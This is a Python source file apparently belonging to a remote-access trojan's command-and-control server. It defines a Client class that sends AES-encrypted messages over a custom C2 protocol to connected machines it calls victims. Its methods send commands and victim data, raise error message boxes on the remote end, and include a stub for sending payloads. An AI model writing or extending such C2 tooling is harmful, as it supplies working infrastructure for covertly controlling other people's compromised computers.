import socket

from lib.EZCrypto import EZRSA, PAES,PRSA, Encoder
from lib.C2P import C2P

class Client:
    def __init__(self, sock: socket.socket) -> None:
        self.sock = sock
        self.addr = None

        self.pAES = PAES()
        self.xml_rsa_pubKey = None
        self.xml_rsa_privKey = None

        self.szChallenge = ''
        self.username = None
        self.szUUID = None
        self.VictimID = None

        self.nLattency = None
        self.dtLastLattency = None

    def send(self, nCmd: int, nParam: int, szMsg: str):
        buffer = C2P(nCmd=nCmd, nParam=nParam, abData=szMsg.encode('utf-8')).get_buffer()
        self.sock.send(buffer)

    def sendcipher(self, nCmd: int, nParam: int, szMsg: str):
        pAES = self.get_aes()
        abMsg = szMsg.encode('utf-8')
        abEncMsg = pAES.encrypt_cbc(abMsg)
        szEncMsg = Encoder.bytes2b64str(abEncMsg)

        self.send(nCmd=nCmd, nParam=nParam, szMsg=szEncMsg)

    def sendpayload(self, szName: str):
        pass

    def sendcommand(self, nCmd: int, nParam: int):
        self.send(nCmd=nCmd, nParam=nParam, szMsg=C2P.random_str())

    def sendclnt(self, szMsg: str):
        self.sendcipher(3, 4, szMsg)

    def sendclntls(self, aMsg: list):
        self.sendcipher(3, 4, '|'.join([Encoder.stre2b64(x) for x in aMsg]))

    def sendclnterr(self, szCaption: str, szText: str, bShowMsgbox: bool = True):
        self.sendclnt(f'err|{int(bShowMsgbox)}|{Encoder.stre2b64(szCaption)}|{Encoder.stre2b64(szText)}')

    def sendvictim(self, aMsg: list):
        self.sendcipher(2, 2, '|'.join([Encoder.stre2b64(x) for x in aMsg]))

    def sendraw(self, szMsg):
        self.sock.sendall(szMsg)

    def set_aes(self, pAES: PAES):
        self.pAES = pAES

    def get_aes(self) -> PAES:
        return self.pAES

    def close(self):
        self.sock.close()